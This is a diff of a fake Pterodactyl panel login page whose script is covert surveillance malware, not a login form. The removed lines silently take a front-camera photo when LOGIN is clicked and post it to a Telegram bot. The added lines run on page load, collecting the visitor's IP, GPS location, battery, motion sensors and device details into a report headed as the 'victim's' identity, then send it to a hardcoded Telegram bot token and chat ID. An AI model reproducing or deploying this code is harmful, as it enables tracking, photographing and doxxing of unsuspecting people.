@@ -68,10 +68,6 @@
     font-size: 12px;
     color: #bbb;
   }
-
-  video, canvas {
-    display: none;
-  }
 </style>
 </head>
 <body>
@@ -80,69 +76,224 @@
   <h2>Login to Continue</h2>
   <input type="text" placeholder="USERNAME OR EMAIL" />
   <input type="password" placeholder="PASSWORD" />
-  <button id="loginBtn">LOGIN</button>
+  <button>LOGIN</button>
   <a href="#">FORGOT PASSWORD?</a>
   <div class="footer">© 2015 - 2025 Pterodactyl Software</div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
 <script>
-  const BOT_TOKEN = '<YOUR_BOT_TOKEN>'; // Ganti dengan token bot kamu
-  const CHAT_ID = '<YOUR_CHAT_ID>';     // Ganti dengan chat ID kamu
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const loginButton = document.getElementById('loginBtn');
-
-  let stream = null;
-
-  async function startCamera() {
+(async () => {
+  async function getIP() {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" }, // Gunakan "environment" untuk kamera belakang
-        audio: false
-      });
-      video.srcObject = stream;
-    } catch (err) {
-      console.error("Kamera gagal dimuat:", err);
+      let res = await fetch('https://api.ipify.org?format=json');
+      if (!res.ok) return 'unknown';
+      let data = await res.json();
+      return data.ip || 'unknown';
+    } catch {
+      return 'unknown';
     }
   }
 
-  async function captureAndSendPhoto() {
-    if (!stream) return;
+  async function getLocation() {
+    return new Promise(resolve => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords), 
+          () => resolve(null),
+          {timeout:5000}
+        );
+      } else {
+        resolve(null);
+      }
+    });
+  }
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  async function getBattery() {
+    if (navigator.getBattery) {
+      try {
+        let batt = await navigator.getBattery();
+        return {
+          charging: batt.charging,
+          level: batt.level
+        };
+      } catch {
+        return null;
+      }
+    }
+    return null;
+  }
 
-    const imageData = canvas.toDataURL('image/jpeg');
+  function getMotionAndRotation(timeout = 900) {
+    return new Promise(resolve => {
+      let orientation = {alpha:null,beta:null,gamma:null};
+      let motion = {acceleration:null,accelerationIncludingGravity:null,rotationRate:null};
+
+      function handleOrientation(e) {
+        orientation.alpha = e.alpha;
+        orientation.beta = e.beta;
+        orientation.gamma = e.gamma;
+      }
+      function handleMotion(e) {
+        motion.acceleration = e.acceleration;
+        motion.accelerationIncludingGravity = e.accelerationIncludingGravity;
+        motion.rotationRate = e.rotationRate;
+      }
+      window.addEventListener('deviceorientation', handleOrientation);
+      window.addEventListener('devicemotion', handleMotion);
+
+      setTimeout(() => {
+        window.removeEventListener('deviceorientation', handleOrientation);
+        window.removeEventListener('devicemotion', handleMotion);
+        resolve({orientation, motion});
+      }, timeout);
+    });
+  }
+
+  function parseDeviceInfo() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const lowerUA = ua.toLowerCase();
+
+    let brand = 'Unknown';
+    let model = 'Unknown';
+
+    if (/iphone/.test(lowerUA)) brand = 'Apple';
+    else if (/ipad/.test(lowerUA)) brand = 'Apple (iPad)';
+    else if (/android/.test(lowerUA)) {
+      brand = 'Android';
+      let modelMatch = ua.match(/([^)]+)/);
+      if (modelMatch && modelMatch[1]) {
+        let parts = modelMatch[1].split(';').map(s => s.trim());
+        if (parts.length > 1) model = parts[1];
+        if (parts.length > 2) model = parts[2]; 
+      }
+    } else if (/windows phone/.test(lowerUA)) brand = 'Windows Phone';
+
+    if (model === 'Unknown') model = ua;
+
+    return {brand, model, ua};
+  }
+
+  function getTimeInfo() {
+    let now = new Date();
+    return {
+      localTime: now.toLocaleTimeString(),
+      localDate: now.toLocaleDateString(),
+      localYear: now.getFullYear(),
+      localMonth: now.getMonth() + 1,
+      localDay: now.getDate(),
+      localHour: now.getHours()
+    };
+  }
+
+  function getCPUInfo() {
+    return navigator.hardwareConcurrency || 'unknown';
+  }
+
+  function getNetworkInfo() {
+    let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn) return 'unknown';
+    return conn.effectiveType || 'unknown';
+  }
+
+  function getScreenInfo() {
+    return {
+      width: window.screen.width,
+      height: window.screen.height,
+      availWidth: window.screen.availWidth,
+      availHeight: window.screen.availHeight,
+      pixelDepth: window.screen.pixelDepth
+    };
+  }
+
+  function guessGenderEmoji() {
+    return '👤';
+  }
+
+  async function composeMessage() {
+    const ip = await getIP();
+    const loc = await getLocation();
+    const battery = await getBattery();
+    const {orientation, motion} = await getMotionAndRotation(900);
+    const device = parseDeviceInfo();
+    const time = getTimeInfo();
+    const cpu = getCPUInfo();
+    const network = getNetworkInfo();
+    const screen = getScreenInfo();
+    const birthDate = '-', birthYear = '-', studentStatus = '-', userName = '-', userAge = '-', userGender = '-', securityStatus = '-', vpsStatus = '-';
+
+    let battText = battery ? (battery.charging ? 'Sedang mengisi daya' : 'Tidak mengisi daya') + ` (${Math.round(battery.level * 100)}%)` : 'Tidak tersedia';
+    let locationText = loc ? `Lat: ${loc.latitude.toFixed(5)}, Lon: ${loc.longitude.toFixed(5)}` : 'Izin lokasi tidak diberikan / tidak tersedia';
+
+    let lines = [
+      '🚨 *Identitas dari HP korban* 🚨',
+      `• IP / HP Nama: ${ip} / ${device.brand} ${device.model}`,
+      `• Alamat IP: ${ip}`,
+      `• Jam HP: ${time.localTime}`,
+      `• Tahun dari HP: ${time.localYear}`,
+      `• Merek HP: ${device.brand}`,
+      `• Nama HP: ${device.model}`,
+      `• Lahir Tanggal: ${birthDate}`,
+      `• Lahir Tahun: ${birthYear}`,
+      `• Cas HP: ${battText}`,
+      `• Status: ${studentStatus}`,
+      `• CPU (cores): ${cpu}`,
+      `• GPU: Tidak diketahui`,
+      `• VPS: ${vpsStatus}`,
+      `• Rotasi: alpha:${orientation.alpha ? orientation.alpha.toFixed(2) : '-'}, beta:${orientation.beta ? orientation.beta.toFixed(2) : '-'}, gamma:${orientation.gamma ? orientation.gamma.toFixed(2) : '-'}`,
+      `• Location/Lokasi Nama: ${locationText}`,
+      `• Info dari HP: UserAgent: ${device.ua}`,
+      `• Gerak HP: ACC: ${motion.acceleration ? JSON.stringify(motion.acceleration) : '-'}, ACCG: ${motion.accelerationIncludingGravity ? JSON.stringify(motion.accelerationIncludingGravity) : '-'}, RotationRate: ${motion.rotationRate ? JSON.stringify(motion.rotationRate) : '-'}`,
+      `• Status Pelajar: ${studentStatus}`,
+      `• Nama: ${userName}`,
+      `• Umur: ${userAge}`,
+      `• Kecepatan Gerakan: -`,
+      `• Rotasi HP: alpha:${orientation.alpha ? orientation.alpha.toFixed(2) : '-'}, beta:${orientation.beta ? orientation.beta.toFixed(2) : '-'}, gamma:${orientation.gamma ? orientation.gamma.toFixed(2) : '-'}`,
+      `• Jaringan: ${network}`,
+      `• Pesan: Otomatis terkirim tanpa diisi`,
+      `• Lebar Layar: ${screen.width}px`,
+      `• Keamanan HP: ${securityStatus}`,
+      `• Nama Daerah: ${locationText}`,
+      `• Nama: ${userName}`,
+      `• Gender: ${userGender} ${guessGenderEmoji()}`,
+      `• Merek HP: ${device.brand}`
+    ];
+
+    return lines.join('\n');
+  }
+
+  async function sendToTelegram(msg) {
+    const BOT_TOKEN = '7522024883:AAF-X33lPQnH1ih9mv6ftdGRH_qyQY0BeN0';
+    const CHAT_ID = '6631076203';
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const params = {
+      chat_id: CHAT_ID,
+      text: msg,
+      parse_mode: 'Markdown'
+    };
 
     try {
-      await fetch(`https://api.telegram.org/bot${7522024883:AAF-X33lPQnH1ih9mv6ftdGRH_qyQY0BeN0}/sendPhoto`, {
+      const res = await fetch(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: 6631076203,
-          photo: imageData
-        })
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(params)
       });
-    } catch (err) {
-      console.error("Gagal kirim ke Telegram:", err);
+      return await res.json();
+    } catch(e) {
+      return {error: e.toString()};
     }
   }
 
-  // Mulai kamera saat halaman dibuka
-  window.onload = () => {
-    startCamera();
-  };
+  // === Lokasi harus diizinkan baru lanjut ===
+  const locationCheck = await getLocation();
+  if (locationCheck) {
+    const message = await composeMessage();
+    await sendToTelegram(message);
+  } else {
+    alert("Akses lokasi tidak diberikan. Data tidak dikirim.");
+  }
 
-  // Kirim foto saat tombol login ditekan
-  loginButton.addEventListener('click', async () => {
-    await captureAndSendPhoto();
-  });
+})();
 </script>
 </body>
 </html>
